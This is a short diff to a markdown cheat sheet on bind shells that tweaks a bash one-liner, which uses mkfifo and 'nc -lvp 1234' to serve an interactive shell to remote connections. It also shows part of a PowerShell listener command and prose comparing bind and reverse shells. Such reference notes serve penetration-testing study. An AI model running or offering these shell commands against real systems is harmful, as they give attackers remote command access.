@@ -21,7 +21,7 @@ In a bind-shell the attacking machine initiates a connection to a listener port 
 ### bash
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 ```
 
 ### netcat
@@ -51,7 +51,6 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.So
  ```
 
 Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
-
 
 
 ## Some more resources
